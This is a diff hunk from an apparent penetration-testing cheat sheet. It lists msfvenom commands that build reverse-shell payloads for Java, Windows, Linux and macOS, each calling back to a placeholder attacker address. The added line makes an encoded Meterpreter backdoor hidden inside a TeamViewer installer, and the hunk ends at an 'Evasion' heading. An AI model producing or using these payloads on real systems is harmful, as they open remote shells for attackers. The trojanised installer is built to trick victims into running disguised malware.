@@ -1350,7 +1350,8 @@ $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f raw 
 $ msfvenom -p java/jsp_shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f war > shell.war
 $ msfvenom -p windows/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f exe -o shell.exe
 $ msfvenom -p linux/x64/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f elf > shell.elf
-$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f macho > shell.macho	
+$ msfvenom -p osx/x86/shell_reverse_tcp LHOST=<IP Address> LPORT=<Port> -f macho > shell.macho
+$ msfvenom windows/x86/meterpreter_reverse_tcp LHOST=<IP Address> LPORT=<Port> -k -x ~/Downloads/TeamViewer_Setup.exe -e x86/shikata_ga_nai -a x86 --platform windows -o ~/Desktop/TeamViewer_Setup.exe -i 5
 ```
 
 #10. - Evasion
